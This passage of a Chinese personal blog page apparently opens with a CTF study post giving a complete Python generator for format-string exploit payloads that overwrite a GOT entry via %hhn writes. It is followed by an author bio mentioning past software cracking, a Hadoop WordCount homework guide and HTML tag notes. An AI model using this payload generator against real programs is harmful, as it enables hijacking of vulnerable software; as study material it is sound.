+= address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
example: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>)</span><br><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>，<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得写入的每一位的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分部分，按大小排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> part</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得排序后的大小，升序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动计算偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">## 生成payload并对齐</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write， offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'offset is:'</span> + str(offset)</span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626)</span></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626，10)</span></span><br></pre></td></tr></table></figure>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>写完后发觉，只适用于栈长度相对较大的，因为单字节写入的话，payload构造相对会比较长，所以是否还应该开个选项，双字节写入，四字节写入，不过那些是后话了，因为只需改改脚本就行了，编写脚本的目的只是为了更好的理解这个格式化字符串漏洞，理解他的整个过程，等我想到如何写通用payload，就是能设置长度的时候，在改进下。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/about_me/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/19/about_me/" class="post-title-link" itemprop="url">关于我</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-19 03:14:36" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">2019-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:14:54" itemprop="dateModified" datetime="2019-10-30T17:14:54+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/about-me/" itemprop="url" rel="index">
                    <span itemprop="name">about_me</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>506</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="NoOne"><a href="#NoOne" class="headerlink" title="NoOne"></a>NoOne</h1><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>一个无名小卒，个人比较喜欢pwn，因为ctf的re相对没意思，整天都在玩算法，对于现实中的软件完全没有任何用处感觉。<br>以前自己喜欢逆向一些小软件，破解授权自己用，曾帮人破解过一个辅助吧，也没公开，朋友私用。<br>pwn方向的话，现在学到堆的攻击，只差house of系列还没学完了，栈的题目见的比较多，以前只经常打栈题目，然后现在比赛经常都是堆类型题目，所以着重学堆了。学完堆准备学漏洞分析了，自己分析些cve什么的。<br>二进制病毒分析类我也挺喜欢的，我的初心就是想在这方面发展的，后面因为各种原因搁置了，偶尔分析下简单锁机软件吧，现在的话破解软件难度也大了，易语言部分整天都是麻婆壳</p>
<p>成就：全国大学生信息安全竞赛总决赛三等奖，华中区特等奖</p>
<p>在先知安全客也发过几篇文章吧，没啥成就，感觉就是自己还是很菜</p>
<p>目标：以后能在二进制安全方向找份工作，漏洞挖掘类的，或者病毒分析类的</p>
<h2 id="研究方向"><a href="#研究方向" class="headerlink" title="研究方向"></a>研究方向</h2><p>二进制漏洞挖掘，逆向分析</p>
<h2 id="加入组的原因"><a href="#加入组的原因" class="headerlink" title="加入组的原因"></a>加入组的原因</h2><p>二进制学习的途中都没人可以讨论，都是自己在学，不会的也没人教，自己死磕呗，导致学习进度很慢，希望加入组后有个师傅可以带我，学学逆向，学学漏洞挖掘</p>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p>email:<a href="mailto:2505785013@qq.com" target="_blank" rel="noopener">2505785013@qq.com</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/hadoop1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/19/hadoop1/" class="post-title-link" itemprop="url">大数据作业</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-19 03:14:36" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">2019-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:41:19" itemprop="dateModified" datetime="2019-10-30T17:41:19+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BD%9C%E4%B8%9A/" itemprop="url" rel="index">
                    <span itemprop="name">作业</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="hadoop1"><a href="#hadoop1" class="headerlink" title="hadoop1"></a>hadoop1</h1><p>建议执行前先打快照，我原来就是不知道怎么折腾把环境搞崩了，然后又折腾花了好久</p>
<p>java代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.util.GenericOptionsParser;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WordCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        String[] otherArgs = (<span class="keyword">new</span> GenericOptionsParser(conf, args)).getRemainingArgs();</span><br><span class="line">        <span class="keyword">if</span>(otherArgs.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Job job = Job.getInstance(conf, <span class="string">"word count"</span>);</span><br><span class="line">        job.setJarByClass(WordCount.class);</span><br><span class="line">        job.setMapperClass(WordCount.TokenizerMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setReducerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; otherArgs.length - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(otherArgs[otherArgs.length - <span class="number">1</span>]));</span><br><span class="line">        System.exit(job.waitForCompletion(<span class="keyword">true</span>)?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TokenizerMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> IntWritable one = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">private</span> Text word = <span class="keyword">new</span> Text();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TokenizerMapper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            StringTokenizer itr = <span class="keyword">new</span> StringTokenizer(value.toString()); </span><br><span class="line">            <span class="keyword">while</span>(itr.hasMoreTokens()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.word.set(itr.nextToken());</span><br><span class="line">                context.write(<span class="keyword">this</span>.word, one);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntSumReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> IntWritable();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IntSumReducer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            IntWritable val;</span><br><span class="line">            <span class="keyword">for</span>(Iterator i$ = values.iterator(); i$.hasNext(); sum += val.get()) &#123;</span><br><span class="line">                val = (IntWritable)i$.next();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.result.set(sum);</span><br><span class="line">            context.write(key, <span class="keyword">this</span>.result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>选择File-&gt;Export-&gt;一系列next，最后要选择Main_Class</p>
<p><img src="_v_images/20191025211017021_1663740123.png" alt="记得保存main_class"></p>
<p>导出jar后，scp传上去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp wordCounter.jar hadoop@192.168.150.133:/usr/<span class="built_in">local</span>/hadoop</span><br></pre></td></tr></table></figure>


<p>启动hadoop</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sbin/start-all.sh</span><br></pre></td></tr></table></figure>
<p>创建文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/input</span><br><span class="line">./bin/hdfs dfs -mkdir /<span class="built_in">test</span>/output</span><br></pre></td></tr></table></figure>

<p>移动文件到目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/hdfs dfs -mv 你的单词文件 /<span class="built_in">test</span>/input</span><br></pre></td></tr></table></figure>


<p>可以看到目录下有wordCounter.jar</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hadoop@dblab-VirtualBox:/usr/<span class="built_in">local</span>/hadoop$ ls</span><br><span class="line">bin  etc  include  lib  libexec  LICENSE.txt  logs  NOTICE.txt  README.txt  sbin  share  tmp  wordCounter.jar  word.txt</span><br></pre></td></tr></table></figure>

<p>执行hadoop</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/hadoop jar wordCounter.jar <span class="string">'/test/input'</span> <span class="string">'/test/ouput'</span></span><br></pre></td></tr></table></figure>

<p>查看结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./bin/hdfs dfs -cat /<span class="built_in">test</span>/ouput/part-r-00000</span><br><span class="line">game	1</span><br><span class="line">hadoop	2</span><br><span class="line">i	5</span><br><span class="line">love	5</span><br><span class="line">mapreduce	2</span><br><span class="line">this	1</span><br></pre></td></tr></table></figure>


<h1 id="自行配置eclipse自动补全"><a href="#自行配置eclipse自动补全" class="headerlink" title="自行配置eclipse自动补全"></a>自行配置eclipse自动补全</h1><p><img src="_v_images/20191025214212938_984636996.png" alt="如图"></p>
<p>配置自动补全</p>
<p>.abcdefghijklmnopqrstuvwxyz(,</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/htmlLearn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/19/htmlLearn/" class="post-title-link" itemprop="url">前端学习1</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-19 03:14:36" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">2019-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:22:40" itemprop="dateModified" datetime="2019-10-30T17:22:40+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/%E5%89%8D%E7%AB%AF/" itemprop="url" rel="index">
                    <span itemprop="name">前端</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>1.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h1><!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>W3Cschool教程(w3cschool.cn)</title>
</head>

<body>
<p>
    <b>这个文本加粗的</b>
</p>
<p>
    <strong>这个文本是加粗的</strong>
</p>
<p>
    <big>这个文本字体放大</big>
</p>
<p>
    <em>这个文本是斜体的</em>
</p>
<p>
    <i>这个文本是斜体的</i>
</p>
<p>
    <small>这个文本是缩小的</small>
</p>
<p>
    这个文本包含<sub>下标</sub>
</p>
<p>
    这个文本包含<sup>上标</sup>
</p>
</body>
</html>

<h1 id="pre标签"><a href="#pre标签" class="headerlink" title="pre标签"></a>pre标签</h1><pre>
    此例演示如何使用 pre 标签
    对空行和   空格
    进行控制
</pre>

<h1 id="html全称"><a href="#html全称" class="headerlink" title="html全称"></a>html全称</h1><p><a>:anchor 定义锚<br><abbr>:abbreviation 定义缩写<br><acronym>: 定义只取消首字母的缩写 </p>
<address>:定义地址元素 
<area>:定义图像映射内部的区域 
<b>:bold 定义粗体字 
<base>:定义页面当中的所有链接的基准链接 
<bdo>: bidirectional override 定义文字的显示方向 
<big>:定义大号字 
<blockquote>:定义长的引用 
<body>:定义body元素 
<br>:break 插入一个回车 
<button>:定义按钮 
<caption>:定义表格标题 
<cite>:citation 定义引用 
<code>:computer code 定义计算机代码文本 
<col>:column 定义用于表格列的属性 
<colgroup>:column group 定义表格的列祖 
<dd>:definition description 定义定义的描述 
<del>:delete 定义被删除的文本 
<div>:division 定义文档中的节 
<dfn>:defining instance 定义定义的项目。 
<dl>:definition list 定义定义列表 
<dt>:definition term 定义定义的项目 
<em>:emphasized 定义强调文本 
<fieldset>:定义域结构 
<form>:定义表单 
<frame>:定义框架的子窗口 
<frameset>:定义框架集 
<h1>to<h6>:定义标题1到标题6 
<head>:定义关于文档的信息 
<hr>:horizontal 定义水平线 
<html>:hypertext markup language 定义html文档 
<i>:italic 定义斜体字 
<iframe>:inline frame 定义内联框架 
<img>:image 定义图像 
<input>: 定义输入域 
<ins>:inserted 定义被插入的文本 
<kbd>:keyboard 定义键盘文本 
<label>:定义针对表单控件的标签 
<legend>:定义框架集的标题 
<li>:list item 定义列表的项目 
<link>:定义资源引用 
<map>:定义图像映射 
<meta>:定义元信息 
<noframe>:定义无框架的节 
<noscript>:定义无脚本的节 
<object>:定义内嵌对象 
<ol>:ordered list 定义有序列表 
<optgroup>:option group 定义选项组 
<option>:定义下拉列表的选项 
<p>:paragraph 定义段落 
<param>:定义对象的参数 
<pre>:preformatted 定义预格式文本 
<q>:quotation 定义短的引用 
<samp>:sample 定义计算机代码样本 
<script>:定义脚本 
<select>:定义选择列表 
<small>:定义小字体文本 
<span>:定义文档中的节 
<strong>:stronger empasis定义强调文本 
<style>:定义样式的定义 
<sub>:subscript 定义下标文本 
<sup>:superscript 定义上标文本 
<table>:定义表格 
<tbody>:table body 定义表格的主体部分 
<td>:table data cell定义表格单元 
<textarea>:定义文本区域 
<tfoot>:table foot定义表也的脚注 
<th>:table header cell定义表格的表头单元格 
<thead>:table head定义表格的标题 
<title>:定义文档的标题 
<tr>:table row定义表格的行 
<tt>:teletype 定义打字机文本 
<ul>:unordered list 定义无序列表 
<var>:variable 定义变量 


